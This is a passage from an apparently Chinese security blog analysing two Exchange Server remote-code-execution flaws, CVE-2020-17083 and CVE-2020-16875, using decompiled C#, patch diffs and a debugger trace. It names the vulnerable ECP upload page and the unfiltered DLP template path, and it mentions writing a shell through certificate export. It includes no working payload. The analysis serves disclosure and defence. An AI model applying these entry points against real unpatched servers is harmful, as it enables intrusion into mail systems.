class="line"></span><br><span class="line">        &#x2F;&#x2F;写入的文件为base64格式的</span><br><span class="line">        using (StreamWriter streamWriter &#x3D; File.CreateText(this.RequestFile))</span><br><span class="line">        &#123;</span><br><span class="line">            streamWriter.Write(text);</span><br><span class="line">        &#125;</span><br><span class="line">        IL_4F:;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (IOException ex)</span><br><span class="line">    &#123;</span><br><span class="line">        base.WriteError(new InvalidOperationException(Strings.RequestCertificateFileInvalid(ex.Message)), ErrorCategory.InvalidOperation, null);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码很简单，只要使用了<code>BinaryEncoded</code>进行编码，那么就会直接向目标文件写入编码后的数据，但是在使用<code>New-ExchangeCertificate</code>写入编码文件时候，有一个不太友好的地方，对<code>&quot;;</code>等字符不能处理，所以在写<code>shell</code>的时候存在一定的限制。</p><p>接着看<code>Export-ExchangeCertificate</code>的<code>WriteCertiricate</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">private void WriteCertiricate(ExchangeCertificateRpc outputValues)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        if (this.BinaryEncoded)</span><br><span class="line">        &#123;</span><br><span class="line">            using (FileStream fileStream &#x3D; File.Create(this.FileName))</span><br><span class="line">            &#123;</span><br><span class="line">                fileStream.Write(outputValues.ReturnExportFileData, 0, outputValues.ReturnExportFileData.Length);</span><br><span class="line">                goto IL_5E;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        using (StreamWriter streamWriter &#x3D; File.CreateText(this.FileName))</span><br><span class="line">        &#123;</span><br><span class="line">            streamWriter.Write(outputValues.ReturnExportBase64);</span><br><span class="line">        &#125;</span><br><span class="line">        IL_5E:;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!this.HandleException(ex))</span><br><span class="line">        &#123;</span><br><span class="line">            throw;</span><br><span class="line">        &#125;</span><br><span class="line">        base.WriteError(new InvalidOperationException(Strings.ExportCertificateFileInvalid(ex.Message)), ErrorCategory.InvalidOperation, null);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码都差不多，导出的时候必须要使用<code>BinaryEncoded</code>，否则导出的文件是<code>base64</code>编码过的，无法解析执行。进行编码后的文件，是可以显示我们写入的内容的</p><p><img src="/img/CVE-2020-17083/1.png" alt="1"></p><h3 id="更新补丁"><a href="#更新补丁" class="headerlink" title="更新补丁"></a>更新补丁</h3><p><code>Export-ExchangeCertificate</code>的<code>WriteCertiricate</code>对输出的文件名进行了过滤，并且对后缀做了限制，如果不是预先定义的后缀名，则统一加上<code>.pfx</code>后缀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">private void WriteCertiricate(ExchangeCertificateRpc outputValues)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        string text &#x3D; this.FileName;</span><br><span class="line">        string text2 &#x3D; Path.GetExtension(text).Replace(&quot;.&quot;, &quot;&quot;).ToUpper();</span><br><span class="line">        text2 &#x3D; text2.Replace(&quot;-&quot;, &quot;_&quot;);</span><br><span class="line">        if (!Enum.IsDefined(typeof(AllowedCertificateTypes), text2))</span><br><span class="line">        &#123;</span><br><span class="line">            text +&#x3D; &quot;.pfx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if (this.BinaryEncoded)</span><br><span class="line">        &#123;</span><br><span class="line">            using (FileStream fileStream &#x3D; File.Create(text))</span><br><span class="line">            &#123;</span><br><span class="line">                fileStream.Write(outputValues.ReturnExportFileData, 0, outputValues.ReturnExportFileData.Length);</span><br><span class="line">                goto IL_A5;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        using (StreamWriter streamWriter &#x3D; File.CreateText(text))</span><br><span class="line">        &#123;</span><br><span class="line">            streamWriter.Write(outputValues.ReturnExportBase64);</span><br><span class="line">        &#125;</span><br><span class="line">        IL_A5:;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!this.HandleException(ex))</span><br><span class="line">        &#123;</span><br><span class="line">            throw;</span><br><span class="line">        &#125;</span><br><span class="line">        base.WriteError(new InvalidOperationException(Strings.ExportCertificateFileInvalid(ex.Message)), ErrorCategory.InvalidOperation, null);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>New-ExchangeCertificate</code>的<code>WriteRequest</code>补丁也差不多，加上<code>.req</code>后缀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">private void WriteRequest(byte[] data, string text)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        string text2 &#x3D; this.RequestFile;</span><br><span class="line">        string text3 &#x3D; Path.GetExtension(text2).Replace(&quot;.&quot;, &quot;&quot;).ToUpper();</span><br><span class="line">        text3 &#x3D; text3.Replace(&quot;-&quot;, &quot;_&quot;);</span><br><span class="line">        if (!Enum.IsDefined(typeof(AllowedCertificateTypes), text3))</span><br><span class="line">        &#123;</span><br><span class="line">            text2 +&#x3D; &quot;.req&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if (this.BinaryEncoded)</span><br><span class="line">        &#123;</span><br><span class="line">            using (FileStream fileStream &#x3D; File.Create(text2))</span><br><span class="line">            &#123;</span><br><span class="line">                fileStream.Write(data, 0, data.Length);</span><br><span class="line">                goto IL_96;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        using (StreamWriter streamWriter &#x3D; File.CreateText(text2))</span><br><span class="line">        &#123;</span><br><span class="line">            streamWriter.Write(text);</span><br><span class="line">        &#125;</span><br><span class="line">        IL_96:;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (IOException ex)</span><br><span class="line">    &#123;</span><br><span class="line">        base.WriteError(new InvalidOperationException(Strings.RequestCertificateFileInvalid(ex.Message)), ErrorCategory.InvalidOperation, null);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p><a href="https://srcincite.io/advisories/src-2020-0025/">https://srcincite.io/advisories/src-2020-0025/</a></p><p><a href="https://srcincite.io/advisories/src-2020-0026">https://srcincite.io/advisories/src-2020-0026</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
            <tag> Exchange Server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-16875 Exchange Server RCE</title>
      <link href="2020/11/19/CVE-2020-16875/"/>
      <url>2020/11/19/CVE-2020-16875/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>漏洞的形成是因为<code>New-DlpPolicy</code>命令对<code>TempleteData</code>参数的过滤不严，从而导致了<code>RCE</code>。我们可以通过访问<code>https://example.com/ecp/DLPPolicy/ManagePolicyFromISV.aspx?pwmcid=20&amp;ReturnObjectType=1</code>页面来上传<code>payload</code>。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在知道漏洞的原因后，我们找到对应的<code>aspx</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;C#&quot;  </span><br><span class="line">    Inherits&#x3D;&quot;Microsoft.Exchange.Management.ControlPanel.ManagePolicyFromISV&quot;</span><br><span class="line">    MasterPageFile&#x3D;&quot;~&#x2F;CommonMaster.Master&quot;</span><br><span class="line">    Title&#x3D;&quot;&lt;%$Strings:DLPImportTitle%&gt;&quot;</span><br><span class="line">    Caption&#x3D;&quot;&lt;%$Strings:DLPImportCaption%&gt;&quot;</span><br><span class="line">    FVAResource&#x3D;&quot;ManagePolicyFromISVFVA&quot;</span><br><span class="line">    HelpId&#x3D;&quot;ManagePolicyFromISV&quot;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>该页面由<code>Microsoft.Exchange.Management.ControlPanel.ManagePolicyFromISV</code>类进行处理，在这个类的<code>ExecuteUpload</code>函数下断点进行跟踪</p><p><img src="/img/cve-2020-16875/1.png" alt="1"></p><p>接着上传payload，我们跟进函数，并且一步一步向下走</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PowerShellResults powerShellResults &#x3D; dlpisvservice.ProcessUpload(new DLPNewPolicyUploadParameters</span><br><span class="line">                    &#123;</span><br><span class="line">                        Mode &#x3D; this.policyMode.SelectedValue,</span><br><span class="line">                        State &#x3D; RuleState.Enabled.ToString(),</span><br><span class="line">                        Name &#x3D; this.name.Text,</span><br><span class="line">                        Description &#x3D; this.description.Text,</span><br><span class="line">                        TemplateData &#x3D; array</span><br><span class="line">                    &#125;);</span><br></pre></td></tr></table></figure><p>接着到达<code>&#123;Microsoft.Exchange.MessagingPolicies.CompliancePrograms.Tasks.NewDlpPolicyImpl&#125;.LoadDlpPolicyFromCustomTemplateData()</code>来处理传入的<code>TemplateData</code><br><img src="/img/cve-2020-16875/2.png" alt="2"></p><p>在这里调用<code>DlpUtils.LoadDlpPolicyTemplates</code>函数来加载数据，跟进</p><p><img src="/img/cve-2020-16875/3.png" alt="3"></p><p>传入的数据交给了返回类型为<code>IEnumerable&lt;DlpPolicyTemplateMetaData&gt;</code>的<code>Microsoft.Exchange.MessagingPolicies.CompliancePrograms.Tasks.DlpPolicyParser.ParserDlpPolicyTemplates</code>函数做解析处理，查看该函数的定义，部分代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">internal static IEnumerable&lt;DlpPolicyTemplateMetaData&gt; ParseDlpPolicyTemplates(Stream data)</span><br><span class="line">&#123;</span><br><span class="line">    List&lt;DlpPolicyTemplateMetaData&gt; result;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        XDocument xdocument &#x3D; XDocument.Load(data);</span><br><span class="line">        if (EtrSettingsConfiguration.GetSnapshot(MachineSettingsContext.Local, null, null).DlpPolicyTemplateSchemaValidation.Enabled)</span><br><span class="line">        &#123;</span><br><span class="line">            xdocument.Validate(DlpPolicyParser.Schema.Value, null);</span><br><span class="line">        &#125;</span><br><span class="line">        result &#x3D; (from dlpPolicyTemplate in xdocument.Element(&quot;dlpPolicyTemplates&quot;).Elements(&quot;dlpPolicyTemplate&quot;)</span><br><span class="line">        select DlpPolicyParser.ParseDlpPolicyTemplate(dlpPolicyTemplate.ToString())).ToList&lt;DlpPolicyTemplateMetaData&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数解析了<code>xml</code>，判断是否为合法的<code>xml</code>数据，获取<code>dlpPolicyTemplate</code>标签之间的数据，接着再由重写返回类型为<code>DlpPolicyTemplateMetaData</code>的<code>Microsoft.Exchange.MessagingPolicies.CompliancePrograms.Tasks.DlpPolicyParser.ParseDlpPolicyTemplates</code>对每条数据进行处理并且验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">internal static DlpPolicyTemplateMetaData ParseDlpPolicyTemplate(string data)</span><br><span class="line">&#123;</span><br><span class="line">    DlpPolicyTemplateMetaData result;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        XElement root &#x3D; XDocument.Parse(data).Root;</span><br><span class="line">        DlpPolicyTemplateMetaData dlpPolicyTemplateMetaData &#x3D; new DlpPolicyTemplateMetaData();</span><br><span class="line">        dlpPolicyTemplateMetaData.Version &#x3D; root.Attribute(&quot;version&quot;).Value.Trim();</span><br><span class="line">        dlpPolicyTemplateMetaData.State &#x3D; (RuleState)Enum.Parse(typeof(RuleState), root.Attribute(&quot;state&quot;).Value.Trim());</span><br><span class="line">        dlpPolicyTemplateMetaData.Mode &#x3D; (RuleMode)Enum.Parse(typeof(RuleMode), root.Attribute(&quot;mode&quot;).Value.Trim());</span><br><span class="line">        dlpPolicyTemplateMetaData.ImmutableId &#x3D; ((root.Attribute(&quot;id&quot;) &#x3D;&#x3D; null) ? Guid.Empty : Guid.Parse(root.Attribute(&quot;id&quot;).Value.Trim()));</span><br><span class="line">        dlpPolicyTemplateMetaData.ContentVersion &#x3D; root.Element(&quot;contentVersion&quot;).Value.Trim();</span><br><span class="line">        dlpPolicyTemplateMetaData.PublisherName &#x3D; root.Element(&quot;publisherName&quot;).Value.Trim();</span><br><span class="line">        dlpPolicyTemplateMetaData.LocalizedNames &#x3D; DlpPolicyParser.ParseLocalizedString(root.Element(&quot;name&quot;));</span><br><span class="line">        dlpPolicyTemplateMetaData.LocalizedDescriptions &#x3D; DlpPolicyParser.ParseLocalizedString(root.Element(&quot;description&quot;));</span><br><span class="line">        dlpPolicyTemplateMetaData.LocalizedKeywords &#x3D; (from localizedKeyword in root.Element(&quot;keywords&quot;).Elements(&quot;keyword&quot;)</span><br><span class="line">        select DlpPolicyParser.ParseLocalizedString(localizedKeyword)).ToList&lt;Dictionary&lt;string, string&gt;&gt;();</span><br><span class="line">        dlpPolicyTemplateMetaData.RuleParameters &#x3D; (from ruleParameter in root.Element(&quot;ruleParameters&quot;).Elements(&quot;ruleParameter&quot;)</span><br><span class="line">        select new DlpTemplateRuleParameter</span><br><span class="line">        &#123;</span><br><span class="line">            Type &#x3D; ruleParameter.Attribute(&quot;type&quot;).Value.Trim(),</span><br><span class="line">            Required &#x3D; bool.Parse(ruleParameter.Attribute(&quot;required&quot;).Value),</span><br><span class="line">            Token &#x3D; ruleParameter.Attribute(&quot;token&quot;).Value.Trim(),</span><br><span class="line">            LocalizedDescriptions &#x3D; DlpPolicyParser.ParseLocalizedString(ruleParameter.Element(&quot;description&quot;))</span><br><span class="line">        &#125;).ToList&lt;DlpTemplateRuleParameter&gt;();</span><br><span class="line">        dlpPolicyTemplateMetaData.PolicyCommands &#x3D; (from policyCommand in root.Element(&quot;policyCommands&quot;).Elements(&quot;commandBlock&quot;)</span><br><span class="line">        select policyCommand.Value.Trim()).ToList&lt;string&gt;();</span><br><span class="line">        dlpPolicyTemplateMetaData.LocalizedPolicyCommandResources &#x3D; (from localizedResource in root.Element(&quot;policyCommandsResources&quot;).Elements(&quot;resource&quot;)</span><br><span class="line">        select new KeyValuePair&lt;string, Dictionary&lt;string, string&gt;&gt;(localizedResource.Attribute(&quot;token&quot;).Value.Trim(), DlpPolicyParser.ParseLocalizedString(localizedResource))).ToDictionary((KeyValuePair&lt;string, Dictionary&lt;string, string&gt;&gt; pair) &#x3D;&gt; pair.Key, (KeyValuePair&lt;string, Dictionary&lt;string, string&gt;&gt; pair) &#x3D;&gt; pair.Value, StringComparer.OrdinalIgnoreCase);</span><br><span class="line">        &#x2F;&#x2F;对数据进行验证，跟进该函数内部</span><br><span class="line">        dlpPolicyTemplateMetaData.Validate();</span><br><span class="line">        result &#x3D; dlpPolicyTemplateMetaData;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (ArgumentException innerException)</span><br><span class="line">    &#123;</span><br><span class="line">        throw new DlpPolicyParsingException(Strings.DlpPolicyStateStateInvalid, innerException);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (NullReferenceException innerException2)</span><br><span class="line">    &#123;</span><br><span class="line">        throw new DlpPolicyParsingException(Strings.DlpPolicyXmlMissingElements, innerException2);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (XmlException innerException3)</span><br><span class="line">    &#123;</span><br><span class="line">        throw new DlpPolicyParsingException(Strings.DlpPolicyXmlInvalid, innerException3);</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从上面代码中，我们可以看到，每条数据都保存到了<code>dlpPolicyTemplateMetaData</code>变量中，接着又调用了<code>dlpPolicyTemplateMetaData.Validate()</code>对数据进行验证。</p><p><img src="/img/cve-2020-16875/4.png" alt="4"></p><p>跟进<code>Microsoft.Exchange.MessagingPolicies.CompliancePrograms.Tasks.DlpPolicyTemplateMetaData.Validate()</code>函数，我们可以看到对每条数据都进行了验证，但是从函数名来看，似乎只是验证数据长度是否符合要求</p><p><img src="/img/cve-2020-16875/5.png" alt="5"></p><p>查看<code>ValidateFieldSize</code>函数的定义，可以确定只是简单的限制了长度，并没有做其他的过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">internal static void ValidateFieldSize(string fieldName, string value, int sizeLimit)</span><br><span class="line">    &#123;</span><br><span class="line">        if (value.Length &gt; sizeLimit)</span><br><span class="line">        &#123;</span><br><span class="line">            throw new DlpPolicyParsingException(Strings.DlpPolicyFieldLengthsExceedsLimit(fieldName, sizeLimit));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这时候我们可以看到，传入的<code>payload</code>被完整的保存了下来</p><p><img src="/img/cve-2020-16875/6.png" alt="6"></p><p>接下来还要进一步的对<code>cmdlet</code>参数进行验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DlpPolicyTemplateMetaData.ValidateCmdletParameters(x, DlpPolicyTemplateMetaData.RequiredCmdletParameters)</span><br></pre></td></tr></table></figure><p>查看该函数定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">internal static void ValidateCmdletParameters(string cmdlet, IEnumerable&lt;KeyValuePair&lt;string, string&gt;&gt; requiredParameters)</span><br><span class="line">&#123;</span><br><span class="line">    foreach (KeyValuePair&lt;string, string&gt; keyValuePair in requiredParameters)</span><br><span class="line">    &#123;</span><br><span class="line">        if (cmdlet.StartsWith(keyValuePair.Key, StringComparison.InvariantCultureIgnoreCase) &amp;&amp; !Regex.IsMatch(cmdlet, keyValuePair.Value, RegexOptions.IgnoreCase))</span><br><span class="line">        &#123;</span><br><span class="line">            throw new DlpPolicyParsingException(Strings.DlpPolicyMissingRequiredParameter(cmdlet, keyValuePair.Value));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>requiredParameters</code>的键值为：<code>[&quot;New-TransportRule&quot;, &quot;-DlpPolicy&quot;]</code>。首先判断了<code>cmdlet</code>的开头是否为传入的<code>New-TransportRule</code>，接着再判断是否匹配<code>-DlpPolicy</code>的值，如果开头匹配并且内容不匹配，则直接抛出异常解析错误。我们跟入查看此时的值是什么：</p><p><img src="/img/cve-2020-16875/15.png" alt="15"></p><p>从上面可以看到，在判断<code>StartsWith</code>的时候，返回的结果就是<code>False</code>了，所以程序可以正常执行，不会抛出异常。</p><p>接着继续一步一步调试，跟踪到<code>&#123;Microsoft.Exchange.MessagingPolicies.CompliancePrograms.Tasks.NewDlpPolicyImpl&#125;.Validate()</code>函数，这里判断数据是否被修改过，如果修改了，则使用新的数据。在这里可以看到，传入的<code>TemplateData</code>被成功传入了<code>CmdletInfo</code>中，作为命令的参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dlpPolicyTemplateMetaData &#x3D; this.LoadDlpPolicyFromCustomTemplateData();</span><br></pre></td></tr></table></figure><p><img src="/img/cve-2020-16875/7.png" alt="7"></p><p>最后调用<code>DlpUtils.CheckForUnifiedComplianceAvailability&lt;ADComplianceProgram&gt;(this.taskObject, SystemConfigurationTasksHelper.GetCmdletName(this.taskObject.GetType()))</code>进行进一步处理。</p><p>单步跟进，函数到了<code>Microsoft.Exchange.Configuration.Tasks.Task.ProcessRecord()</code>对<code>&#123;Microsoft.Exchange.MessagingPolicies.CompliancePrograms.Tasks.NewDlpPolicy&#125;</code>进行处理。</p><p>这时候进入到<code>this.ProcessTaskStage</code>的<code>MainFunc</code>中，这时候我们查看局部变量的数据，可以看到我们的数据都已经传入了。<br><code>ProcessTaskStage</code>定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private void ProcessTaskStage(TaskStage taskStage, Action initFunc, Action mainFunc, Action completeFunc)</span><br></pre></td></tr></table></figure><p><img src="/img/cve-2020-16875/9.png" alt="9"></p><p><code>MainFunc</code>函数定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">delegate</span><br><span class="line">&#123;</span><br><span class="line">    using (new CmdletMonitoredScope(this.CurrentTaskContext.UniqueId, &quot;BizLogic&quot;, &quot;Task.ProcessRecord&#x2F;InnerProcessRecord&quot;, LoggerHelper.CmdletPerfMonitors))</span><br><span class="line">    &#123;</span><br><span class="line">        using (new CmdletMonitoredScope(this.CurrentTaskContext.UniqueId, &quot;BizLogic&quot;, &quot;InnerProcessRecord&#x2F;InternalStateReset&quot;, LoggerHelper.CmdletPerfMonitors))</span><br><span class="line">        &#123;</span><br><span class="line">            this.InternalStateReset();</span><br><span class="line">        &#125;</span><br><span class="line">        if (!this.HasErrors)</span><br><span class="line">        &#123;</span><br><span class="line">            this.PreInternalValidate();</span><br><span class="line">            using (new CmdletMonitoredScope(this.CurrentTaskContext.UniqueId, &quot;BizLogic&quot;, &quot;InnerProcessRecord&#x2F;InternalValidate&quot;, LoggerHelper.CmdletPerfMonitors))</span><br><span class="line">            &#x2F;&#x2F;函数首先会进入到这里进行一个内部验证，如果验证通过则会进行下一步，但是实际上如果程序未超时，格式正确，这里什么都没有做</span><br><span class="line">            &#123;</span><br><span class="line">                this.InternalValidate();</span><br><span class="line">            &#125;</span><br><span class="line">            this.PostInternalValidate();</span><br><span class="line">        &#125;</span><br><span class="line">        if (!this.HasErrors)</span><br><span class="line">        &#123;</span><br><span class="line">            ProvisioningValidationError[] array &#x3D; ProvisioningLayer.ValidateUserScope(this);</span><br><span class="line">            if (array !&#x3D; null &amp;&amp; array.Length !&#x3D; 0)</span><br><span class="line">            &#123;</span><br><span class="line">                for (int i &#x3D; 0; i &lt; array.Length; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    ProvisioningValidationException exception &#x3D; new ProvisioningValidationException(array[i].Description, array[i].AgentName, array[i].Exception);</span><br><span class="line">                    this.WriteError(exception, (ErrorCategory)array[i].ErrorCategory, null, array.Length - 1 &#x3D;&#x3D; i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            this.InternalProvisioningValidation();</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;在创建新的dlp策略时候，这里会调用新的cmdinfo对象&#123;Get-Notification&#125;来发出确认信息</span><br><span class="line"></span><br><span class="line">        if (!this.HasErrors)</span><br><span class="line">        &#123;</span><br><span class="line">            LocalizedString confirmationMessage &#x3D; this.ConfirmationMessage;</span><br><span class="line">            if (confirmationMessage &#x3D;&#x3D; LocalizedString.Empty || this.ShouldProcess(confirmationMessage))</span><br><span class="line">            &#123;</span><br><span class="line">                string orgId &#x3D; (this.CurrentOrganizationId !&#x3D; null) ? this.CurrentOrganizationId.ToString() : string.Empty;</span><br><span class="line">                if (this.IsVerboseOn &amp;&amp; !TaskLogger.IsSetupLogging)</span><br><span class="line">                &#123;</span><br><span class="line">                    this.WriteVerbose(Strings.VerboseResolvedOrganization(orgId));</span><br><span class="line">                &#125;</span><br><span class="line">                this.PreInternalProcessRecord();</span><br><span class="line">                using (new CmdletMonitoredScope(this.CurrentTaskContext.UniqueId, &quot;BizLogic&quot;, &quot;InnerProcessRecord&#x2F;InternalProcessRecord&quot;, LoggerHelper.CmdletPerfMonitors))</span><br><span class="line">                &#123;</span><br><span class="line">                    &#x2F;&#x2F;前面验证过后，最后会到这里来</span><br><span class="line">                    this.InternalProcessRecord();</span><br><span class="line">                    goto IL_1C8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            this.CurrentTaskContext.WasCancelled &#x3D; true;</span><br><span class="line">            